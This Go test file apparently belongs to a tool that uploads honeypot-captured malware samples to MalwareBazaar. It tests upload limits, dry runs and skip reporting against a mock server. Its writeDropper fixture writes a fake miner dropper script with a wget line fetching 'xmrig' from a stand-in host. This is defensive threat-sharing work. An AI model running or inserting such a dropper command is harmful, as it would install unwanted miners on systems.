package bazaar

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// writeDropper writes a sample that clears Vet: a fetched-origin shell script
// with a recognisable miner family, comfortably over MinSampleBytes.
func writeDropper(t *testing.T, dir, name string) (string, int64) {
	t.Helper()
	p := filepath.Join(dir, name)
	body := []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://example.test/xmrig\n" +
		"# padding so the sample clears the size floor xxxxxxxxxxxxxxxxx\n")
	if err := os.WriteFile(p, body, 0o600); err != nil {
		t.Fatal(err)
	}
	return p, int64(len(body))
}

// TestShareLimitBoundsUploadsNotCandidates is the regression test for the
// --limit bug.
//
// The limit used to be applied by the CLI as `cands = cands[:limit]` BEFORE
// Share ran. Candidates arrive newest-first, and on any deployment with history
// the newest ones are already in the dedup ledger — so the default --limit=10
// spent its entire budget on ten already-shared hashes and uploaded nothing.
// The reference deployment reported "candidates: 34 … uploaded=0 skipped=10"
// with no per-sample output, while --limit=0 found 16 vettable samples sitting
// directly behind the cut. A cap meant to bound API calls was instead bounding
// how far down the list we bothered to look.
//
// The fixture reproduces exactly that: 10 already-uploaded hashes ahead of 3
// fresh ones, with a limit of 2.
func TestShareLimitBoundsUploadsNotCandidates(t *testing.T) {
	dir := t.TempDir()
	p, size := writeDropper(t, dir, "dropper.sh")

	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls.Add(1)
		_, _ = w.Write([]byte(`{"query_status":"inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	fresh := time.Now()
	var cands []Candidate
	for i := 0; i < 10; i++ {
		sha := "known" + strconv.Itoa(i)
		// Pre-seed the ledger: MalwareBazaar already has these.
		if err := rec.RecordBazaarUpload(sha, "inserted", "", fresh); err != nil {
			t.Fatal(err)
		}
		cands = append(cands, Candidate{SHA256: sha, LocalPath: p, SizeBytes: size,
			CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh})
	}
	for i := 0; i < 3; i++ {
		cands = append(cands, Candidate{SHA256: "new" + strconv.Itoa(i), LocalPath: p,
			SizeBytes: size, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh})
	}
	// Reset the recorder's audit log so only this run's uploads are counted;
	// `seen` (the dedup state) is what we want to keep.
	rec.records = nil

	var limitHit int
	uploaded, _, err := Share(context.Background(), rec, cands, Options{
		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20,
		RateLimit:      time.Millisecond,
		MaxUploads:     2,
		OnLimitReached: func(unexamined int) { limitHit = unexamined },
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 2 {
		t.Fatalf("uploaded = %d, want 2 — the limit must bound SUBMISSIONS. If this is 0, "+
			"the budget was spent on the 10 already-shared hashes ahead of the fresh ones, "+
			"which is the bug: a run that shipped nothing while samples were waiting.", uploaded)
	}
	if got := calls.Load(); got != 2 {
		t.Errorf("network calls = %d, want 2 — the cap exists to bound API calls", got)
	}
	// One fresh candidate remains unexamined; the caller must be able to say so
	// rather than implying the backlog is clear.
	if limitHit != 1 {
		t.Errorf("OnLimitReached(unexamined) = %d, want 1 — a bounded run must not read "+
			"as an exhausted one", limitHit)
	}
	var got []string
	for _, r := range rec.records {
		got = append(got, r.sha)
	}
	sort.Strings(got)
	if len(got) != 2 || got[0] != "new0" || got[1] != "new1" {
		t.Errorf("recorded %v, want the two oldest-unshared samples (new0, new1)", got)
	}
}

// TestShareLimitCountsDryRunPreviews pins that --dry-run --limit N previews the
// same N samples the real run would send. A dry run that showed more than the
// real run would ship is a preview of a different operation.
func TestShareLimitCountsDryRunPreviews(t *testing.T) {
	dir := t.TempDir()
	p, size := writeDropper(t, dir, "dropper.sh")

	srv := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
		t.Error("dry-run hit the network")
	}))
	defer srv.Close()

	fresh := time.Now()
	var cands []Candidate
	for i := 0; i < 5; i++ {
		cands = append(cands, Candidate{SHA256: "s" + strconv.Itoa(i), LocalPath: p,
			SizeBytes: size, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh})
	}
	previews := 0
	_, _, err := Share(context.Background(), newMemRecorder(), cands, Options{
		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20,
		RateLimit: time.Millisecond, DryRun: true, MaxUploads: 2,
		OnProgress: func(_ Candidate, _ Classification, r *Result, _ error) {
			if r != nil && r.Status == "dry-run" {
				previews++
			}
		},
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if previews != 2 {
		t.Fatalf("dry-run previewed %d samples under --limit=2, want 2", previews)
	}
}

// TestShareZeroLimitIsUnbounded pins that 0 keeps the old "share everything"
// behaviour, which is what --limit=0 documents.
func TestShareZeroLimitIsUnbounded(t *testing.T) {
	dir := t.TempDir()
	p, size := writeDropper(t, dir, "dropper.sh")

	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls.Add(1)
		_, _ = w.Write([]byte(`{"query_status":"inserted"}`))
	}))
	defer srv.Close()

	fresh := time.Now()
	var cands []Candidate
	for i := 0; i < 4; i++ {
		cands = append(cands, Candidate{SHA256: "z" + strconv.Itoa(i), LocalPath: p,
			SizeBytes: size, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh})
	}
	limitFired := false
	uploaded, _, err := Share(context.Background(), newMemRecorder(), cands, Options{
		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond,
		MaxUploads:     0,
		OnLimitReached: func(int) { limitFired = true },
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 4 {
		t.Errorf("uploaded = %d, want 4 (MaxUploads=0 means unbounded)", uploaded)
	}
	if limitFired {
		t.Error("OnLimitReached fired with no limit set")
	}
}

// TestShareReportsEverySkip pins the OnProgress contract.
//
// Two branches used to skip silently — an empty sha256 and an already-recorded
// upload. Both bumped the `skipped` counter with no callback, so the CLI printed
// a summary like "uploaded=0 skipped=10" above zero per-sample lines and the
// operator had no way to tell a policy rejection from a dedup hit from a bug.
// Every counted skip must be explainable.
func TestShareReportsEverySkip(t *testing.T) {
	dir := t.TempDir()
	p, size := writeDropper(t, dir, "dropper.sh")
	fresh := time.Now()

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"query_status":"inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	if err := rec.RecordBazaarUpload("already", "inserted", "", fresh); err != nil {
		t.Fatal(err)
	}
	rec.records = nil

	cands := []Candidate{
		// No sha: cannot be deduped, previously skipped in silence.
		{SHA256: "", LocalPath: p, SizeBytes: size, CreatedAt: fresh,
			Origin: "cowrie_download", ObservedAt: fresh},
		// Already in the ledger: the most common skip on any live box, also silent.
		{SHA256: "already", LocalPath: p, SizeBytes: size, CreatedAt: fresh,
			Origin: "cowrie_download", ObservedAt: fresh},
		// Oversize: was already reported.
		{SHA256: "toobig", LocalPath: p, SizeBytes: 1 << 30, CreatedAt: fresh,
			Origin: "cowrie_download", ObservedAt: fresh},
		// File gone: was already reported.
		{SHA256: "gone", LocalPath: filepath.Join(dir, "nope"), SizeBytes: size,
			CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
		// Vet rejection (tty transcript): was already reported.
		{SHA256: "tty", LocalPath: p, SizeBytes: size, CreatedAt: fresh,
			Origin: "cowrie_tty", ObservedAt: fresh},
	}

	reported := 0
	var reasons []string
	_, skipped, err := Share(context.Background(), rec, cands, Options{
		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond,
		OnProgress: func(_ Candidate, _ Classification, _ *Result, err error) {
			reported++
			if err != nil {
				reasons = append(reasons, err.Error())
			}
		},
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if skipped != len(cands) {
		t.Fatalf("skipped = %d, want %d (every candidate here is unshippable)", skipped, len(cands))
	}
	if reported != skipped {
		t.Fatalf("OnProgress fired %d times for %d skips — every counted skip must be "+
			"reported, or the summary line contains numbers the operator cannot account for",
			reported, skipped)
	}
	if len(reasons) != skipped {
		t.Fatalf("%d of %d skips carried no reason", skipped-len(reasons), skipped)
	}
	// The two formerly-silent branches must say something specific enough to act
	// on, not just "skipped".
	joined := strings.Join(reasons, "\n")
	for _, want := range []string{"sha256", "bazaar_uploads"} {
		if !strings.Contains(joined, want) {
			t.Errorf("skip reasons %q do not explain %q", joined, want)
		}
	}
}
